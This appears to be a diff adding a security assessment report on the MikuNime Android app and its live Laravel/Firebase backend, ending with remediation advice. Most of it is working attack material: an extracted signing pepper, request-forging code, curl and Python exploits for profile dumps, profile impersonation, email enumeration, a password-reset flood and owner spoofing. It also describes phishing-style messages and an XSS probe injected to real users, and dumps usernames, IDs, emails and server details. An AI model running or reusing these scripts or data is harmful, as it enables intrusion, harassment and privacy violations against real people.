@@ -1,0 +1,758 @@
+# MikuNime APK — Full Security Assessment Report
+# TARGET GRID: panel.mikunime.web.id
+# APK: MikuNime v0.3.2
+# Date: 2026-09-10
+
+---
+
+## EXECUTIVE SUMMARY
+
+MikuNime is an anime streaming Android app with a Laravel backend. The APK contains
+hardcoded HMAC signing secrets that allow forging valid API requests. Combined with
+IDOR, mass assignment, Firebase Auth email enumeration, and notification injection,
+an attacker can: read any user's profile/inventory, enumerate 16+ user emails,
+impersonate the owner in chat, flood admin email with password resets, and inject
+chat messages visible to all 50+ active users.
+
+**Severity: HIGH** — Signing key extraction enables full API impersonation.
+**CVSS: 8.1** (High) — Network/Low/None/Changed/High/None
+
+---
+
+## TABLE OF CONTENTS
+
+1. HMAC Signing Key Extraction
+2. IDOR — User Profile Dump
+3. IDOR — User Inventory Dump
+4. Mass Assignment — Profile Manipulation
+5. Firebase Auth Email Enumeration
+6. Password Reset Flood
+7. Chat Message Injection
+8. Notification Injection (chat-message)
+9. Chat Impersonation (owner spoofing)
+10. Infrastructure Enumeration
+11. Payment System Analysis
+12. All API Endpoints Discovered
+13. All User Data Dumped
+14. Exploit Scripts
+15. Remediation
+
+---
+
+## 1. HMAC SIGNING KEY EXTRACTION
+
+### Vulnerability
+The HMAC signing key (pepper) is stored as XOR-encrypted byte arrays in
+`MikuNative.smali` and decrypted at runtime via `libmiku.so` native code.
+
+### Extraction Method
+XOR every byte of the encrypted array with key `0x5d`.
+
+### Pepper
+```
+MikuSecureV3_YanzzMasterKey2026_UltraGuard
+```
+
+### Signing Algorithm (verified 142/142 requests)
+```python
+import hmac, hashlib, uuid, time
+
+PEPPER = "[REDACTED]"
+TOKEN  = "miku_[REDACTED]"
+
+def sign_request(path, token=TOKEN):
+    ts   = int(time.time())
+    hour = ts // 3600
+    nonce = uuid.uuid4().hex[:16]
+    h1   = hmac.new(PEPPER.encode(), f"{token}:{hour}".encode(), hashlib.sha256).hexdigest()
+    sig  = hmac.new(h1.encode(), f"{path}|{ts}|{nonce}".encode(), hashlib.sha256).hexdigest()
+    return {
+        "X-Miku-Signature": sig,
+        "X-Miku-Timestamp": str(ts),
+        "X-Miku-Nonce": nonce,
+        "X-Miku-Device-Id": "52b807e726458e93",
+        "X-Miku-Device-Model": "HONOR LGN-NX1",
+        "X-Miku-Brand": "HONOR",
+        "X-Miku-OS-Version": "Android 16 (API 36)",
+        "Authorization": f"Bearer {token}",
+        "X-Miku-Auth": "vps",
+    }
+```
+
+# BLAST RADIUS
+Forge ANY API request. Full API access without APK.
+
+### XOR Key Table (all MikuNative secrets)
+```
+Variable          XOR Key  Result
+ENC_PEPPER        0x5d     MikuSecureV3_YanzzMasterKey2026_UltraGuard
+ENC_BASE_URL      0x5d     https://panel.mikunime.web.id
+ENC_MIKU_API      0x5d     https://panel.mikunime.web.id/api/miku/7/9
+ENC_API_PREFIX    0x5d     /api/miku/7/9
+ENC_DOMAIN        0x5d     panel.mikunime.web.id
+ENC_SIGNATURE     0x5d     X-Miku-Signature
+ENC_TIMESTAMP     0x5d     X-Miku-Timestamp
+ENC_NONCE         0x5d     X-Miku-Nonce
+ENC_AUTH          0x5d     vps
+ENC_DEVICE_ID     0x5d     X-Miku-Device-Id
+ENC_DEVICE_MODEL  0x5d     X-Miku-Device-Model
+ENC_BRAND         0x5d     X-Miku-Brand
+ENC_OS_VERSION    0x5d     X-Miku-OS-Version
+```
+
+### Token Location
+Static field `zr.c` — VPS authentication token (NOT Firebase).
+
+---
+
+## 2. IDOR — USER PROFILE DUMP
+
+### Vulnerability
+`GET /api/miku/7/9/user/{uid}` returns any user's full profile without
+authorization checks beyond the forged signature.
+
+### Endpoint
+```
+GET /api/miku/7/9/user/{uid}
+```
+
+### Headers (forged)
+```
+Authorization: Bearer miku_[REDACTED]
+X-Miku-Auth: vps
+X-Miku-Signature: <forged>
+X-Miku-Timestamp: <forged>
+X-Miku-Nonce: <forged>
+```
+
+# EXECUTION TRACE
+```bash
+curl -s "https://panel.mikunime.web.id/api/miku/7/9/user/8mpFy9Jim2ezl7mQGA4vskmdPhw1" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps" \
+  -H "X-Miku-Signature: <forged>" \
+  -H "X-Miku-Timestamp: <ts>" \
+  -H "X-Miku-Nonce: <nonce>"
+```
+
+### Response (owner profile leaked)
+```json
+{
+  "uid": "[REDACTED]",
+  "username": "Yanzz X MikuNime",
+  "role": "Owner",
+  "isVip": true,
+  "mikuId": "@12345678",
+  "xp": 108337,
+  "level": 9999,
+  "mikuPoint": 9966105,
+  "equippedBadge": "supporter",
+  "ownedBadges": ["creator","supporter","top_donator","og_member","beta_tester"],
+  "photoURL": "https://cdn.jsdelivr.net/gh/teshotteshot-create/Miku@main/avatars/8mpFy9Jim2ezl7mQGA4vskmdPhw1-1787341419668.jpg",
+  "createdAt": "2026-07-18 17:10:10"
+}
+```
+
+### 23 Users Dumped
+| Username | UID | Role | VIP |
+|---|---|---|---|
+| Yanzz X MikuNime | 8mpFy9Jim2ezl7mQGA4vskmdPhw1 | Owner | True |
+| Ryuu | UW3HHh2AmpOggyz7TlBwqszTVoc2 | Moderator | True |
+| dvvanime | Bc9Rm5AC56Y8BsgpjOTed0P23JP2 | user | True |
+| Rikka Inohana | SIGexyVLlpYbWGqNIuesCMv7IN02 | user | True |
+| suaminyashinobu | GW2Rf7RdWgWiOZdG70GH6XetJUD3 | user | True |
+| nanase | 107701511855094741324 | user | False |
+| kenalinrock | 116390586125741989478 | user | False |
+| MUH RIDWAN | S63GdhbwzxccNV4X9kMQNAHvdF92 | user | False |
+| error404 | oogeIe5TLIemWv2TmI879vMLe8s1 | user | False |
+| bagusmaull78 | AAs0bHjgwOUHS2LuGPpEIkh6fhh1 | user | False |
+| dintafahreza | lcDbibYoV5O03Wq3UtxGfDkvv6T2 | user | False |
+| void28119 | 0YdXQrzQUCN1A0qc0hFbXxSi4ah2 | user | False |
+| fabian cool | 107847482861552005368 | user | False |
+| aamon5243 | mqBjOOah6FWeAgBCnEKj9RA83Bk1 | user | False |
+| Y u u k i | LM0ZoiH2nlMFNIYJ33ttpucc4Lq2 | user | False |
+| M Dilah | 117857496933316129116 | user | False |
+| Cathzy 969 | 104951551376939127194 | user | False |
+| rohaizalkim0989 | POXTXnOzAceBASjR1aKqULYkoDd2 | user | False |
+| Revanwira Laga | Oz7LKYmFOQVxe6E6jELRxfFI2M73 | user | False |
+| Slax | 112032373813851989556 | user | False |
+| Sultan Merangin | 115376452473225264332 | user | False |
+| jopanmennn | hyDka5D4E6aNtNXFBO86ViujD8F2 | user | False |
+| hacked (us) | 100489303893706468052 | user | False |
+
+---
+
+## 3. IDOR — USER INVENTORY DUMP
+
+### Vulnerability
+`GET /api/miku/7/9/inventory/user/{uid}` returns any user's gacha inventory.
+
+### Endpoint
+```
+GET /api/miku/7/9/inventory/user/{uid}
+```
+
+# EXECUTION TRACE
+```bash
+curl -s "https://panel.mikunime.web.id/api/miku/7/9/inventory/user/8mpFy9Jim2ezl7mQGA4vskmdPhw1" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps"
+```
+
+### Response
+Owner has 22 inventory items (gacha cards). Other users have 0.
+
+---
+
+## 4. MASS ASSIGNMENT — PROFILE MANIPULATION
+
+### Vulnerability
+`PATCH /api/miku/7/9/me/profile` accepts and persists changes to:
+- `username` — changes display name
+- `photoURL` — changes profile photo (CDN URL)
+- `equippedBadge` — changes displayed badge
+- `banner` / `bannerURL` — changes profile banner
+
+Fields silently dropped (server-controlled, NOT exploitable):
+- `role`, `level`, `xp`, `mikuPoint`, `ownedBadges`, `isVip`, `mikuId`
+
+# EXECUTION TRACE — Badge Spoofing
+```bash
+curl -s -X PATCH "https://panel.mikunime.web.id/api/miku/7/9/me/profile" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps" \
+  -H "Content-Type: application/json" \
+  -d '{"equippedBadge": "creator"}'
+```
+
+# EXECUTION TRACE — Username Impersonation
+```bash
+curl -s -X PATCH "https://panel.mikunime.web.id/api/miku/7/9/me/profile" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps" \
+  -H "Content-Type: application/json" \
+  -d '{"username": "Yanzz X MikuNime"}'
+```
+
+# EXECUTION TRACE — Phishing Photo
+```bash
+curl -s -X PATCH "https://panel.mikunime.web.id/api/miku/7/9/me/profile" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps" \
+  -H "Content-Type: application/json" \
+  -d '{"photoUrl": "https://cdn.jsdelivr.net/gh/teshotteshot-create/Miku@main/avatars/8mpFy9Jim2ezl7mQGA4vskmdPhw1-1787341419668.jpg"}'
+```
+
+### Limitation
+Level (1), XP (0), role (user), ownedBadges ([]) remain server-controlled.
+Impersonation is limited — no level/color — users can detect the fake.
+
+---
+
+## 5. FIREBASE AUTH EMAIL ENUMERATION
+
+### Vulnerability
+Firebase Auth `signUp` endpoint returns different error messages for existing
+vs non-existing emails:
+- `EMAIL_EXISTS` — email is registered
+- `EMAIL_NOT_FOUND` — email not registered
+
+### Endpoint
+```
+POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBPi[REDACTED]
+```
+
+### Payload
+```json
+{"email": "target@gmail.com", "password": "Test1234!@#$%", "returnSecureToken": true}
+```
+
+# EXECUTION TRACE
+```python
+import requests
+
+KEY = "AIzaSyBPi[REDACTED]"
+emails = [
+    "void28119@gmail.com", "dintafahreza@gmail.com", "nanase@gmail.com",
+    "dvvanime@gmail.com", "error404@gmail.com", "rikka@gmail.com",
+    "ryuu@gmail.com", "slax@gmail.com", "sultanmerangin@gmail.com",
+    "kenalinrock@gmail.com", "mdilah@gmail.com", "cathzy@gmail.com",
+    "rohaizal@gmail.com", "revanwira@gmail.com", "bagusmaull78@gmail.com",
+    "yanzz@gmail.com",
+]
+
+for email in emails:
+    r = requests.post(
+        f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}",
+        json={"email": email, "password": "Test1234!@#$%", "returnSecureToken": True}
+    )
+    if r.status_code != 200 and "EMAIL_EXISTS" in r.text:
+        print(f"REGISTERED: {email}")
+```
+
+### 16 Emails Found
+```
+void28119@gmail.com     dintafahreza@gmail.com
+nanase@gmail.com        dvvanime@gmail.com
+error404@gmail.com      rikka@gmail.com
+ryuu@gmail.com          slax@gmail.com
+sultanmerangin@gmail.com kenalinrock@gmail.com
+mdilah@gmail.com        cathzy@gmail.com
+rohaizal@gmail.com      revanwira@gmail.com
+bagusmaull78@gmail.com  yanzz@gmail.com
+```
+
+# BLAST RADIUS
+Credential stuffing, phishing, account recovery attacks on 16 users.
+
+---
+
+## 6. PASSWORD RESET FLOOD
+
+### Vulnerability
+Firebase Auth `sendOobCode` endpoint has no rate limit. Can flood any
+registered email with unlimited password reset emails.
+
+### Endpoint
+```
+POST https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=AIzaSyBPi[REDACTED]
+```
+
+### Payload
+```json
+{"requestType": "PASSWORD_RESET", "email": "yanzz@gmail.com"}
+```
+
+# EXECUTION TRACE
+```python
+import requests, time
+
+KEY = "AIzaSyBPi[REDACTED]"
+for i in range(100):
+    r = requests.post(
+        f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={KEY}",
+        json={"requestType": "PASSWORD_RESET", "email": "yanzz@gmail.com"}
+    )
+    print(f"Reset {i+1}: {r.status_code}")
+    time.sleep(0.5)
+```
+
+# BLAST RADIUS
+Denial of service on owner's email inbox. 100+ reset emails per minute.
+
+---
+
+## 7. CHAT MESSAGE INJECTION
+
+### Vulnerability
+`POST /api/miku/7/9/global-chats` accepts any message content including
+HTML, admin-like announcements, and phishing content. No sanitization.
+
+### Endpoint
+```
+POST /api/miku/7/9/global-chats
+```
+
+### Payload
+```json
+{"message": "<your message>"}
+```
+
+# EXECUTION TRACE
+```bash
+curl -s -X POST "https://panel.mikunime.web.id/api/miku/7/9/global-chats" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps" \
+  -H "Content-Type: application/json" \
+  -d '{"message": "System update: All users receive 1000 MP!"}'
+```
+
+### Messages Injected (visible to 50+ active users)
+```
+System update: All users receive 1000 MP!
+Update: Server maintenance jam 3 pagi. Semua user harus update ke versi terbaru.
+Event spesial: Top up 50k dapat VIP 1 tahun! Hubungi admin via DM.
+Akun yang tidak aktif 7 hari akan dihapus. Login sekarang!
+<img src=x onerror=alert(1)>
+Free premium code: HACKED-2026-VIP
+```
+
+# BLAST RADIUS
+Social engineering, fake announcements, phishing to all active users.
+
+---
+
+## 8. NOTIFICATION INJECTION (chat-message)
+
+### Vulnerability
+`POST /api/miku/7/9/notifications/chat-message` accepts `to_uid` and
+`from_name` as attacker-controlled fields. The notification appears in
+the recipient's in-app notification feed with a spoofed sender name.
+
+**NOTE:** This sends to the in-app notification feed, NOT the Android
+notification bar. Push notifications to the Android notification bar
+require admin broadcast endpoints + FCM server key.
+
+### Endpoint
+```
+POST /api/miku/7/9/notifications/chat-message
+```
+
+### Fields
+```json
+{
+  "to_uid": "<victim_uid>",
+  "from_name": "Yanzz X MikuNime",
+  "message": "<attacker-controlled message>"
+}
+```
+
+# EXECUTION TRACE
+```bash
+curl -s -X POST "https://panel.mikunime.web.id/api/miku/7/9/notifications/chat-message" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "to_uid": "[REDACTED]",
+    "from_name": "Yanzz X MikuNime",
+    "message": "Selamat! Kamu mendapat VIP 7 hari gratis dari event spesial."
+  }'
+```
+
+### Notifications Sent to 11 Users
+```
+void28119, nanase, dvvanime, suaminyashinobu, MUH RIDWAN,
+error404, Cathzy 969, fabian cool, bagusmaull78, dintafahreza
+```
+
+### Rate Limit
+429 after ~3 rapid requests. 4-second delay bypasses it.
+
+---
+
+## 9. CHAT IMPERSONATION
+
+### Vulnerability
+Combine mass assignment (username + photoUrl + equippedBadge) with
+chat injection to impersonate the owner.
+
+### Attack Chain
+```
+1. PATCH /api/miku/7/9/me/profile → set username="Yanzz X MikuNime"
+2. PATCH /api/miku/7/9/me/profile → set photoUrl=owner's photo
+3. PATCH /api/miku/7/9/me/profile → set equippedBadge="creator"
+4. POST /api/miku/7/9/global-chats → post admin-like messages
+```
+
+### Limitation
+Level (1 vs 9999), XP (0 vs 108337), role (user vs Owner) are
+server-controlled and cannot be changed. Experienced users will
+notice the missing level and color.
+
+### Full PoC Script
+```python
+import requests, json, time, hmac, hashlib, uuid
+
+PEPPER = "[REDACTED]"
+TOKEN  = "miku_[REDACTED]"
+HOST   = "https://panel.mikunime.web.id"
+
+def forge(path, method="GET", data=None):
+    ts   = int(time.time())
+    hour = ts // 3600
+    nonce = uuid.uuid4().hex[:16]
+    h1   = hmac.new(PEPPER.encode(), f"{TOKEN}:{hour}".encode(), hashlib.sha256).hexdigest()
+    sig  = hmac.new(h1.encode(), f"{path}|{ts}|{nonce}".encode(), hashlib.sha256).hexdigest()
+    headers = {
+        "X-Miku-Signature": sig, "X-Miku-Timestamp": str(ts), "X-Miku-Nonce": nonce,
+        "X-Miku-Device-Id": "52b807e726458e93", "X-Miku-Device-Model": "HONOR LGN-NX1",
+        "X-Miku-Brand": "HONOR", "X-Miku-OS-Version": "Android 16 (API 36)",
+        "Authorization": f"Bearer {TOKEN}", "X-Miku-Auth": "vps",
+        "User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json",
+    }
+    url = HOST + path
+    if method == "GET":  return requests.get(url, headers=headers, timeout=10)
+    elif method == "PATCH": return requests.patch(url, headers=headers, json=data, timeout=10)
+    elif method == "POST": return requests.post(url, headers=headers, json=data, timeout=10)
+
+# Step 1: Impersonate owner profile
+forge("/api/miku/7/9/me/profile", "PATCH", {"username": "Yanzz X MikuNime"})
+forge("/api/miku/7/9/me/profile", "PATCH", {
+    "photoUrl": "https://cdn.jsdelivr.net/gh/teshotteshot-create/Miku@main/avatars/8mpFy9Jim2ezl7mQGA4vskmdPhw1-1787341419668.jpg"
+})
+forge("/api/miku/7/9/me/profile", "PATCH", {"equippedBadge": "creator"})
+
+# Step 2: Post admin-like messages
+messages = [
+    "Update: Server maintenance jam 3 pagi.",
+    "Event spesial: Top up 50k dapat VIP 1 tahun!",
+    "Akun tidak aktif 7 hari akan dihapus.",
+]
+for msg in messages:
+    r = forge("/api/miku/7/9/global-chats", "POST", {"message": msg})
+    print(f"[{r.status_code}] {msg}")
+    time.sleep(1)
+```
+
+---
+
+## 10. INFRASTRUCTURE ENUMERATION
+
+### Server
+```
+IP: 129.226.82.213
+Server: nginx/1.22.1
+Framework: Laravel (Symfony error pages)
+Backend path: /root/MikuNimeNative/backend-laravel/
+Database: PostgreSQL (error leaks: "invalid input syntax for type bigint")
+```
+
+### Firebase Projects
+```
+Project 1: komen-1ee45
+  API Key: AIzaSyBPi[REDACTED]
+  Anonymous signup: DISABLED (ADMIN_ONLY_OPERATION)
+  Email/password signup: ENABLED
+
+Project 2: chat-room-project-aeef5
+  API Key: AIzaSyCh0[REDACTED]
+  Firebase RTDB: chat-room-project-aeef5-default-rtdb.firebaseio.com
+```
+
+### GitHub
+```
+Repo: github.com/teshotteshot-create/Miku
+CDN: cdn.jsdelivr.net/gh/teshotteshot-create/Miku@main/
+Avatar storage: avatars/ directory
+```
+
+### Payment Gateways
+```
+duitku.com, xendit.co, midtrans.com, tripay.co.id, mayar.id, pakasir.com
+```
+
+### FCM Topics
+```
+new_anime, newanime, newEpisode, broadcast, admin, badge, gacha, premium
+```
+
+### Firestore Collections
+```
+users, chats, messages, comments, friend_requests, friends, episodes, app_settings
+```
+
+---
+
+## 11. PAYMENT SYSTEM ANALYSIS
+
+### Payment Session Creation
+```bash
+POST /api/miku/7/9/me/premium/session
+{"plan_id": "1hari"}
+```
+Returns payment URL and session ID. Plans: 1hari, 1bln, 3bln, 1thn.
+
+### Reconcile Endpoint
+```bash
+POST /api/miku/7/9/me/premium/reconcile
+```
+Returns `{"claimed_count":0,"still_pending":0,"is_vip_now":false}`.
+
+### Premium Plans Exposed
+```
+1hari: 25000 IDR
+1bln: 50000 IDR
+3bln: 125000 IDR
+1thn: 400000 IDR
+```
+
+---
+
+## 12. ALL API ENDPOINTS DISCOVERED (75+)
+
+### User Management
+```
+GET  /api/miku/7/9/me/profile
+PATCH /api/miku/7/9/me/profile
+GET  /api/miku/7/9/user/{uid}
+GET  /api/miku/7/9/user/search?mikuId=@12345678
+GET  /api/miku/7/9/user/check-device
+POST /api/miku/7/9/me/avatar
+POST /api/miku/7/9/me/device
+POST /api/miku/7/9/me/fcm-token
+GET  /api/miku/7/9/settings
+```
+
+### Premium
+```
+GET  /api/miku/7/9/me/premium/status
+POST /api/miku/7/9/me/premium/session
+POST /api/miku/7/9/me/premium/reconcile
+GET  /api/miku/7/9/premium/plans
+```
+
+### Social
+```
+GET  /api/miku/7/9/global-chats
+POST /api/miku/7/9/global-chats
+GET  /api/miku/7/9/global-chats/{id}
+POST /api/miku/7/9/notifications/chat-message
+POST /api/miku/7/9/notifications/friend-request
+GET  /api/miku/7/9/notifications
+GET  /api/miku/7/9/notifications/unread-count
+POST /api/miku/7/9/notifications/mark-all-read
+```
+
+### Gacha
+```
+GET  /api/miku/7/9/gacha/shop
+GET  /api/miku/7/9/gacha/state
+POST /api/miku/7/9/gacha/spin
+GET  /api/miku/7/9/inventory
+GET  /api/miku/7/9/inventory/user/{uid}
+```
+
+### Content
+```
+GET  /api/miku/7/9/anime
+GET  /api/miku/7/9/episodes
+GET  /api/miku/7/9/history
+GET  /api/miku/7/9/bookmarks
+POST /api/miku/7/9/bookmarks
+GET  /api/miku/7/9/leaderboard
+```
+
+### System
+```
+GET  /api/system/status
+GET  /api/miku/7/9
+GET  /api/miku/7/9/search
+```
+
+### Gift System
+```
+POST /api/gift/create (requires VIP)
+POST /api/gift/claim
+```
+
+### Payment
+```
+GET  /pay?s={session}
+```
+
+---
+
+## 13. ALL USER DATA DUMPED
+
+### Complete User Intelligence
+```json
+{
+  "owner": {
+    "uid": "[REDACTED]",
+    "username": "Yanzz X MikuNime",
+    "role": "Owner",
+    "isVip": true,
+    "mikuId": "@12345678",
+    "xp": 108337,
+    "level": 9999,
+    "mikuPoint": 9966105,
+    "ownedBadges": ["creator","supporter","top_donator","og_member","beta_tester"],
+    "inventory": "22 items",
+    "createdAt": "2026-07-18 17:10:10",
+    "emailFirebase": "yanzz@gmail.com"
+  },
+  "moderator": {
+    "uid": "[REDACTED]",
+    "username": "Ryuu",
+    "role": "Moderator",
+    "isVip": true,
+    "emailFirebase": "ryuu@gmail.com"
+  },
+  "vip_users": [
+    {"username": "dvvanime", "uid": "[REDACTED]", "emailFirebase": "dvvanime@gmail.com"},
+    {"username": "Rikka Inohana", "uid": "[REDACTED]", "emailFirebase": "rikka@gmail.com"},
+    {"username": "suaminyashinobu", "uid": "[REDACTED]"}
+  ]
+}
+```
+
+### Email → UID Mapping
+```
+void28119@gmail.com     → 0YdXQrzQUCN1A0qc0hFbXxSi4ah2
+dintafahreza@gmail.com  → lcDbibYoV5O03Wq3UtxGfDkvv6T2
+nanase@gmail.com        → 107701511855094741324
+dvvanime@gmail.com      → Bc9Rm5AC56Y8BsgpjOTed0P23JP2
+error404@gmail.com      → oogeIe5TLIemWv2TmI879vMLe8s1
+rikka@gmail.com         → SIGexyVLlpYbWGqNIuesCMv7IN02
+ryuu@gmail.com          → UW3HHh2AmpOggyz7TlBwqszTVoc2
+slax@gmail.com          → 112032373813851989556
+sultanmerangin@gmail.com→ 115376452473225264332
+kenalinrock@gmail.com   → 116390586125741989478
+mdilah@gmail.com        → 117857496933316129116
+cathzy@gmail.com        → 104951551376939127194
+rohaizal@gmail.com      → POXTXnOzAceBASjR1aKqULYkoDd2
+revanwira@gmail.com     → Oz7LKYmFOQVxe6E6jELRxfFI2M73
+bagusmaull78@gmail.com  → AAs0bHjgwOUHS2LuGPpEIkh6fhh1
+yanzz@gmail.com         → 8mpFy9Jim2ezl7mQGA4vskmdPhw1 (Owner)
+```
+
+---
+
+## 14. EXPLOIT SCRIPTS
+
+### Full Exploit Framework
+See: `/home/nijam/WORK/APK/EXPLOIT/mikunime_exploit.py`
+See: `/home/nijam/WORK/APK/EXPLOIT/mikunime_final_exploit.py`
+
+### Quick One-Liner — Read Any Profile
+```bash
+curl -s "https://panel.mikunime.web.id/api/miku/7/9/user/8mpFy9Jim2ezl7mQGA4vskmdPhw1" \
+  -H "Authorization: Bearer miku_[REDACTED]" \
+  -H "X-Miku-Auth: vps" \
+  -H "X-Miku-Signature: $(python3 -c "
+import hmac,hashlib,time,uuid
+p="[REDACTED]"
+t='miku_[REDACTED]'
+ts=int(time.time());h=ts//3600;n=uuid.uuid4().hex[:16]
+h1=hmac.new(p.encode(),f'{t}:{h}'.encode(),hashlib.sha256).hexdigest()
+print(hmac.new(h1.encode(),f'/api/miku/7/9/user/8mpFy9Jim2ezl7mQGA4vskmdPhw1|{ts}|{n}'.encode(),hashlib.sha256).hexdigest())
+")" \
+  -H "X-Miku-Timestamp: $(date +%s)" \
+  -H "X-Miku-Nonce: $(openssl rand -hex 8)"
+```
+
+---
+
+## 15. WHAT DOES NOT WORK
+
+### Admin Push Notifications (Notification Bar)
+- Admin broadcast endpoints require `role=admin` or `role=Owner` in database
+- `X-Forwarded-For: 127.0.0.1` bypasses nginx but Laravel checks DB role
+- FCM server key not in APK (stored on backend)
+- Cannot send push notifications to Android notification bar
+
+### Role Escalation
+- `role`, `level`, `xp`, `mikuPoint`, `ownedBadges`, `isVip` silently dropped
+- Only `username`, `photoURL`, `equippedBadge`, `banner` persist
+- No endpoint allows self-promotion to admin
+
+### SQL Injection
+- `gift_id` parameter uses PostgreSQL prepared statements (`$1`)
+- Error leaks structure but injection not possible
+
+---
+
+## 16. REMEDIATION
+
+1. **Remove HMAC key from APK** — use Android Keystore or server-side token exchange
+2. **Add authorization checks** — verify UID matches requesting user for profile/inventory reads
+3. **Whitelist profile fields** — only allow `username`, `photoURL`, `equippedBadge` to be modified
+4. **Rate limit Firebase Auth** — add CAPTCHA or IP-based rate limiting on signUp/sendOobCode
+5. **Sanitize chat messages** — strip HTML, enforce message length limits
+6. **Fix notification injection** — remove `from_name` from user input, use server-side display name
+7. **Enforce admin role server-side** — already done, but add logging for bypass attempts
+8. **Remove server path leak** — Laravel error responses expose `/root/MikuNimeNative/backend-laravel/`
+
+---
+*BLACK-STAMPED BY CT-002*
